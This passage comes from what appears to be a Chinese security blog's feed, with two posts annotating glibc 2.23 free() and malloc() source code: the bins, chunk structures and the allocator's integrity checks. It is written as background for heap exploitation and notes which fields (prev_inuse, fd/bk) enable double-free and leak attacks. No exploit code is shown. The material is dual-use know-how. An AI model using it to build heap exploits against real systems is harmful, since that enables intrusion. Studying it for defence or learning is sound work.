class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">// 获得 nextchunk 的下一个 chunk, 的 pre_inused位</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 nextchunk 也是 free 状态的，合并</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// 合并的结果放置到 unsorted bin</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 防止 unsortedbin 被破坏</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): corrupted unsorted chunks"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 free 得到的 unsorted bin 的 size(包括合并chunk 得到的) 大于等于 FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">      systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>大概流程</p><ul><li>首先做了一些检查， p != top_chunk, p-&gt;size 不能越界， 限制了 next_chunk-&gt;size, p要处于 inuse状态（通过 next_chunk-&gt;pre_inused 判断）</li><li>接着判断 p 的前后相邻块是不是 free 状态，如果是就合并</li><li>根据此次拿到的 unsorted bin 的 大小，如果 size&gt;=FASTBIN_CONSOLIDATION_THRESHOLD 就会触发 malloc_consolidate</li></ul><p>如果 p 是通过 mmap 获得的，就通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munmap_chunk (p);</span><br></pre></td></tr></table></figure></p><p>释放掉他</p><h2 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h2><p><img alt="" data-src="/imgs/check_free.png" class="lozad"></p><p>来源 <a href="https://github.com/DhavalKapil/heap-exploitation" target="_blank" rel="noopener">https://github.com/DhavalKapil/heap-exploitation</a></p><p><a href="https://heap-exploitation.dhavalkapil.com/author.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/author.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GI-libc-free&quot;&gt;&lt;a href=&quot;#GI-libc-free&quot; class=&quot;headerlink&quot; title=&quot;_GI___libc_free&quot;&gt;&lt;/a&gt;_GI___libc_free&lt;/h2&gt;&lt;p&gt;首先是 _GI___libc_free&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/malloc%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/malloc源码简单分析/</id>
    <published>2020-02-26T10:29:09.000Z</published>
    <updated>2020-04-08T12:37:14.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文中未做说明 均是指 glibc 2.23</p><h2 id="简单源码分析"><a href="#简单源码分析" class="headerlink" title="简单源码分析"></a>简单源码分析</h2><p>本节只是简单跟读了一下 malloc 的源码， 说的比较简单，很多细节还是要自己拿一份源代码来读</p><h2 id="堆中的一些数据结构"><a href="#堆中的一些数据结构" class="headerlink" title="堆中的一些数据结构"></a>堆中的一些数据结构</h2><h3 id="堆管理结构"><a href="#堆管理结构" class="headerlink" title="堆管理结构"></a>堆管理结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line"> <span class="keyword">mutex_t</span> mutex;                 <span class="comment">/* Serialize access. */</span></span><br><span class="line"> <span class="keyword">int</span> flags;                       <span class="comment">/* Flags (formerly in max_fast). */</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line"> <span class="comment">/* Statistics for locking. Only used if THREAD_STATS is defined. */</span></span><br><span class="line"> <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> mfastbinptr fastbins[NFASTBINS];    <span class="comment">/* Fastbins */</span></span><br><span class="line"> mchunkptr top;</span><br><span class="line"> mchunkptr last_remainder;</span><br><span class="line"> mchunkptr bins[NBINS * <span class="number">2</span>];</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];   <span class="comment">/* Bitmap of bins */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>           <span class="comment">/* Linked list */</span></span><br><span class="line"> INTERNAL_SIZE_T system_mem;</span><br><span class="line"> INTERNAL_SIZE_T max_system_mem;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><ul><li>malloc_state结构是我们最常用的结构，其中的重要字段如下：</li><li>fastbins：存储多个链表。每个链表由空闲的fastbin组成，是fastbin freelist。</li><li>top ：top chunk，指向的是arena中剩下的空间。如果各种freelist都为空，则从top chunk开始分配堆块。</li><li>bins：存储多个双向链表。意义上和堆块头部的双向链表一样，并和其组成了一个双向环状空闲列表（freelist）。这里的bins位于freelist的结构上的头部，后向指针（bk）指向freelist逻辑上的第一个节点。分配chunk时从逻辑上的第一个节点分配寻找合适大小的堆块。</li></ul><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>prev_size：相邻的前一个堆块大小。这个字段只有在前一个堆块（且该堆块为normal chunk）处于释放状态时才有意义。这个字段最重要（甚至是唯一）的作用就是用于堆块释放时快速和相邻的前一个空闲堆块融合。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块中用户写入的数据。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题。</li><li>size：本堆块的长度。长度计算方式：size字段长度+用户申请的长度+对齐。libc以 size_T 长度<em>2 为粒度对齐。例如 32bit 以 4</em>2=8byte 对齐，64bit 以 8*2=0×10 对齐。因为最少以8字节对齐，所以size一定是8的倍数，故size字段的最后三位恒为0，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则 bit=1。libc判断 当前堆块是否处于free状态的方法 就是 判断下一个堆块的 pre_inuse 是否为 1 。这里也是 double free 和 null byte offset 等漏洞利用的关键。</li><li>fd &amp;bk：双向指针，用于组成一个双向空闲链表。故这两个字段只有在堆块free后才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据。两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果。</li><li>值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表。</li></ul><p>来源 <a href="https://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/91527.html</a></p><h2 id="maclloc-源码分析"><a href="#maclloc-源码分析" class="headerlink" title="maclloc 源码分析"></a>maclloc 源码分析</h2><p>用户调用 malloc 时会先进入 __libc_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">// 如果设置了 __malloc_hook 就执行然后返回</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果设置了 __malloc_hook 就执行它然后返回， 否则进入 _int_malloc 这个函数就是 malloc 的具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     计算出实际需要的大小，大小按照 2 * size_t 对齐， 64位： 0x10</span></span><br><span class="line"><span class="comment">     所以如个 malloc(0x28) ----&gt; nb = 0x30, 0x10 header + 0x20 当前块 + 0x8 下一块的 pre_size</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">    如果是第一次触发 malloc, 就会调用 sysmalloc---&gt; mmap 分配内存返回</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先把传入的 bytes 转换为 chunk 的实际大小，保存到 nb 里面。然后如果是第一次调用 malloc , 就会进入 sysmalloc 分配内存。</p><h3 id="搜索Fastbin"><a href="#搜索Fastbin" class="headerlink" title="搜索Fastbin"></a>搜索Fastbin</h3><p>接着会看申请的 nb 是不是在 fastbin 里面，如果是进入 fastbin 的处理流程<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">// 找到nb 对应的 fastbin 的 索引 idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">// 找到对应的 fastbin 的指针</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>) <span class="comment">//如果 fastbin 非空，就进入这里</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">// 判断大小是否满足 fastbin相应bin的大小要求</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先根据 nb 找到该大小对应的 fastbin 的项， 然后看看该 fastbin 是不是为空，如果非空，就分配该 fastbin 的第一个 chunk 给用户。<br>分配过程还会检查待分配的 chunk 的 size 是不是满足在该 fastbin 项的限制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index (chunksize (victim)) != idx</span><br></pre></td></tr></table></figure></p><h3 id="搜索Smallbin"><a href="#搜索Smallbin" class="headerlink" title="搜索Smallbin"></a>搜索Smallbin</h3><p>如果 fastbin 为空或者 nb 不在 fastbin 里面，就会进入 smallbin 和 largebin 的处理逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 